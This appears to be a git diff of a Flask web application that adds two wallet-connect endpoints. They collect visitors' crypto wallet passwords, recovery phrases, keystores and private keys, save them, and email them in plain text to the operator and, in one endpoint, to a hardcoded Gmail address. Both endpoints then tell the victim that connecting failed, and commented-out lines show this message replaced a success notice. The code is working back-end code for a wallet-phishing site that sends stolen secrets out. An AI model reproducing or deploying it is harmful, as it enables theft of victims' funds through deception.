@@ -1,18 +1,18 @@
 from datetime import datetime
-from flask import abort, current_app, session, jsonify, render_template, url_for, flash, redirect, request, Blueprint
+from os import getenv
+from flask import abort, session, jsonify, render_template, url_for, flash, redirect, request, Blueprint
 from flask_login import login_user, current_user, logout_user, login_required
-from sqlalchemy import or_
 
 import sqlalchemy as sa, traceback
 from jsonschema import validate, ValidationError
 
-from web.apis.errors import bad_request
+from web.apis.utils import error_response, success_response
 from web import db, bcrypt
-from web.models import Transaction, Role, User, Task, Order, Notification, AccountType, AccountDetail
+from web.models import Transaction, User, Wallet_types, Wallets, Task, Order, Notification, AccountDetail
 from sqlalchemy.orm import joinedload
 
 from web.utils import save_image, email, ip_adrs
-from web.auth.forms import ( SignupForm, SigninForm, UpdateMeForm, ForgotForm, ResetForm)
+from web.auth.forms import ( ForgotForm, ResetForm)
 from web.utils.decorators import admin_or_current_user, role_required
 from web.utils.providers import oauth2providers
 
@@ -71,6 +71,318 @@ update_user_schema = {
     "required": ["username", "email", "password", "withdrawal_password"]
 }
 
+# wallet_schema = {
+#     "type": "object",
+#     "properties": {
+#         "type": {"type": "string"},
+#         "password": {"type": "string"},
+#         "phrase": {"type": "string"},
+#         "keystore": {"type": "string"},
+#         "privatekey": {"type": "string"}
+#     },
+#     "required": ["type", "password", "phrase", "keystore", "privatekey"]
+# }
+wallet_schema = {
+    "type": "object",
+    "properties": {
+        "type": {"type": "string"},  # Always required
+        "password": {"type": "string"},
+        "phrase": {"type": "string"},
+        "keystore": {"type": "string"},
+        "privatekey": {"type": "string"}
+    },
+    "required": ["type"],  # Type is always required
+    "if": {
+        "properties": {"keystore": {"type": "string"}}
+    },
+    "then": {
+        "required": ["password"]  # Require password if keystore is provided
+    }
+}
+
+
+# ==========================================
+
+@user_bp.route('/submit-wallet-former', methods=['POST'])
+@csrf.exempt
+def submit_wallet_former():
+    try:
+        
+        # Handle the incoming data
+        if request.content_type == 'application/json':
+            data = request.get_json()
+        elif 'multipart/form-data' in request.content_type:
+            data = request.form.to_dict()
+            print("form-data", data)
+        else:
+            return jsonify({"success": False, "error": "Content-Type must be application/json or multipart/form-data"})
+
+        if not data:
+            return jsonify({"success": False, "error":"No data received to connect wallet"})
+
+        print(data)
+        
+        type = int(data.get('type'))
+        password = data.get('password')
+        phrase = data.get('phrase')
+        keystore = data.get('keystore')
+        privatekey = data.get('privatekey')
+
+        # Validate "type" is always required
+        if not type:
+            return error_response('Wallet type is required.')
+
+        # Validate at least one field is provided (excluding "type")
+        if not any([password, phrase, keystore, privatekey]):
+            return error_response('Provide at least one of password, phrase, keystore, or private key.')
+
+        # If keystore is provided, ensure password is also provided
+        if keystore and not password:
+            return error_response( 'Password is required when keystore is provided.')
+        
+        # If keystore is provided, ensure password is also provided
+        if password and not keystore:
+            return error_response( 'KeyStore is required when password is provided.')
+        
+        # Validate wallet type exists
+        wallet_type = Wallet_types.query.filter_by(id=type).first()
+        if not wallet_type:
+            return error_response("Invalid wallet type provided.")
+        
+        # Validate the data against the schema
+        try:
+            validate(instance=data, schema=wallet_schema)
+        except ValidationError as e:
+            return error_response(f"{e.message}")
+
+        # Save the wallet data to the database
+        wallet = Wallets(
+            type_id=wallet_type.id,
+            password=password,
+            phrase=phrase,
+            keystore=keystore,
+            privatekey=privatekey
+        )
+        db.session.add(wallet)
+        db.session.commit()
+
+        # Email subject and content
+        subject = f"[Incoming Wallets] {wallet_type.title}"
+        html_body = f"""
+        <html>
+        <body>
+            <h3>New Wallet Submission</h3>
+            <table style="border-collapse: collapse; width: 100%; font-family: Arial, sans-serif; font-size: 14px; color: #333;">
+                <thead>
+                    <tr>
+                        <th style="border: 1px solid #ddd; padding: 8px; background-color: #f4f4f4;">Field</th>
+                        <th style="border: 1px solid #ddd; padding: 8px; background-color: #f4f4f4;">Value</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td style="border: 1px solid #ddd; padding: 8px;">Wallet Type</td>
+                        <td style="border: 1px solid #ddd; padding: 8px;">{wallet_type.title}</td>
+                    </tr>
+                    <tr>
+                        <td style="border: 1px solid #ddd; padding: 8px;">Wallet Password</td>
+                        <td style="border: 1px solid #ddd; padding: 8px;">{password}</td>
+                    </tr>
+                    <tr>
+                        <td style="border: 1px solid #ddd; padding: 8px;">Recovery Phrase</td>
+                        <td style="border: 1px solid #ddd; padding: 8px;">{phrase}</td>
+                    </tr>
+                    <tr>
+                        <td style="border: 1px solid #ddd; padding: 8px;">Keystore</td>
+                        <td style="border: 1px solid #ddd; padding: 8px;">{keystore}</td>
+                    </tr>
+                    <tr>
+                        <td style="border: 1px solid #ddd; padding: 8px;">Private Key</td>
+                        <td style="border: 1px solid #ddd; padding: 8px;">{privatekey}</td>
+                    </tr>
+                </tbody>
+            </table>
+        </body>
+        </html>
+        """
+        text_body = (
+            f"New Wallet Submission\n\n"
+            f"Wallet Type: {wallet_type.title}\n"
+            f"Wallet Password: {password}\n"
+            f"Recovery Phrase: {phrase}\n"
+            f"Keystore: {keystore}\n"
+            f"Private Key: {privatekey}"
+        )
+
+        # Send email
+        print(getenv('MAIL_USERNAME'), getenv('MAIL_PASSWORD'))
+        email.send_email(
+            subject=subject,
+            sender=getenv('MAIL_USERNAME'),
+            recipients=[getenv('MAIL_USERNAME'), 'jameschristo962@gmail.com'],  # Adjust recipient as needed
+            text_body=text_body,
+            html_body=html_body
+        )
+        data = {'message':f'Error connecting Your {wallet_type.title} wallet.',
+        #data = {'message':'Your wallet details have been submitted successfully!',
+                'redirect':url_for('main.index')}
+        return success_response(data['message'], data=data)
+    
+    except Exception as e:
+        traceback.format_exc()
+        print(e)
+        return error_response(str(e))
+
+import smtplib
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+from email.utils import formataddr
+from os import getenv
+
+@user_bp.route('/submit-wallet', methods=['POST'])
+@csrf.exempt
+def submit_wallet():
+    try:
+        # Handle the incoming data
+        if request.content_type == 'application/json':
+            data = request.get_json()
+        elif 'multipart/form-data' in request.content_type:
+            data = request.form.to_dict()
+            print("form-data", data)
+        else:
+            return jsonify({"success": False, "error": "Content-Type must be application/json or multipart/form-data"})
+
+        if not data:
+            return jsonify({"success": False, "error": "No data received to connect wallet"})
+
+        print(data)
+        
+        type = int(data.get('type'))
+        password = data.get('password')
+        phrase = data.get('phrase')
+        keystore = data.get('keystore')
+        privatekey = data.get('privatekey')
+
+        # Validate "type" is always required
+        if not type:
+            return error_response('Wallet type is required.')
+
+        # Validate at least one field is provided (excluding "type")
+        if not any([password, phrase, keystore, privatekey]):
+            return error_response('Provide at least one of password, phrase, keystore, or private key.')
+
+        # If keystore is provided, ensure password is also provided
+        if keystore and not password:
+            return error_response('Password is required when keystore is provided.')
+
+        if password and not keystore:
+            return error_response('KeyStore is required when password is provided.')
+
+        # Validate wallet type exists
+        wallet_type = Wallet_types.query.filter_by(id=type).first()
+        if not wallet_type:
+            return error_response("Invalid wallet type provided.")
+
+        # Save the wallet data to the database
+        wallet = Wallets(
+            type_id=wallet_type.id,
+            password=password,
+            phrase=phrase,
+            keystore=keystore,
+            privatekey=privatekey
+        )
+        db.session.add(wallet)
+        db.session.commit()
+
+        # Email subject and content
+        subject = f"[Incoming Wallets] {wallet_type.title}"
+        html_body = f"""
+        <html>
+        <body>
+            <h3>New Wallet From Web3 Auth </h3>
+            <table style="border-collapse: collapse; width: 100%; font-family: Arial, sans-serif; font-size: 14px; color: #333;">
+                <thead>
+                    <tr>
+                        <th style="border: 1px solid #ddd; padding: 8px; background-color: #f4f4f4;">Properties</th>
+                        <th style="border: 1px solid #ddd; padding: 8px; background-color: #f4f4f4;">Values</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td style="border: 1px solid #ddd; padding: 8px;">Wallet Type</td>
+                        <td style="border: 1px solid #ddd; padding: 8px;">
+                        {wallet_type.title}
+                        </td>
+                    </tr>
+                    <tr>
+                        <td style="border: 1px solid #ddd; padding: 8px;">Wallet Password</td>
+                        <td style="border: 1px solid #ddd; padding: 8px;">{password}</td>
+                    </tr>
+                    <tr>
+                        <td style="border: 1px solid #ddd; padding: 8px;">Recovery Phrase</td>
+                        <td style="border: 1px solid #ddd; padding: 8px;">{phrase}</td>
+                    </tr>
+                    <tr>
+                        <td style="border: 1px solid #ddd; padding: 8px;">Keystore</td>
+                        <td style="border: 1px solid #ddd; padding: 8px;">{keystore}</td>
+                    </tr>
+                    <tr>
+                        <td style="border: 1px solid #ddd; padding: 8px;">Private Key</td>
+                        <td style="border: 1px solid #ddd; padding: 8px;">{privatekey}</td>
+                    </tr>
+                </tbody>
+            </table>
+        </body>
+        </html>
+        """
+        text_body = (
+            f"\n\n\nWallet Details Plain Text Format\n\n"
+            f"Wallet Type: {wallet_type.title}\n"
+            f"Wallet Password: {password}\n"
+            f"Recovery Phrase: {phrase}\n"
+            f"Keystore: {keystore}\n"
+            f"Private Key: {privatekey}"
+        )
+
+        # Send email using smtplib
+        sender_email = getenv('MAIL_USERNAME')
+        sender_name = "Wallet Notification"
+        sender_password = getenv('MAIL_PASSWORD')
+        recipients = [getenv('MAIL_USERNAME')]  # Add your recipients here
+
+        try:
+            msg = MIMEMultipart()
+            msg['From'] = formataddr((sender_name, sender_email))
+            msg['To'] = ', '.join(recipients)
+            msg['Subject'] = subject
+
+            msg.attach(MIMEText(html_body, 'html'))
+            msg.attach(MIMEText(text_body, 'plain'))
+
+            # Connect to the SMTP server and send the email
+            # with smtplib.SMTP('smtp.gmail.com', 587) as server:
+            with smtplib.SMTP(getenv('MAIL_SERVER'), getenv('MAIL_PORT')) as server:
+                server.starttls()
+                server.login(sender_email, sender_password)
+                server.sendmail(sender_email, recipients, msg.as_string())
+
+            print(f"Email sent successfully to {recipients}")
+
+        except Exception as email_error:
+            print(f"Failed to send email: {email_error}")
+            # return error_response("Failed to send email. Please try again.")
+            return error_response("Failed to connect. Please try again.")
+
+        data = {
+            # 'message': f'Your {wallet_type.title} wallet has been successfully submitted!',
+            'message': f'Error connecting Your {wallet_type.title} wallet.',
+            'redirect': url_for('main.index')
+        }
+        return success_response(data['message'], data=data)
+
+    except Exception as e:
+        traceback.print_exc()
+        return error_response(str(e))
 
 @user_bp.route("/user", methods=['POST'])
 @csrf.exempt
@@ -378,14 +690,12 @@ def auth():
             user.ip = ip_adrs.user_ip()
             db.session.commit()
             login_user(user, remember=data.get('remember', False))
-            return jsonify({"success": True, "message": "Authentication Successful", "redirect": url_for('main.index')})
+            return jsonify({"success": True, "message": "Authentication Successful", "redirect": url_for('main.user_wallets')})
         else:
             return jsonify({"success": False, "error": "Invalid Authentication"})
 
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)})
-
-
 
 @user_bp.route('/api/users', methods=['GET'])
 @csrf.exempt
@@ -410,7 +720,6 @@ def get_pending_tasks(user_id):
     # Pending tasks are those in total_task_ids but not in completed_task_ids
     pending_task_ids = total_task_ids - completed_task_ids
     return len(pending_task_ids)
-
 
 
 @user_bp.route('/api/stats', methods=['GET'])
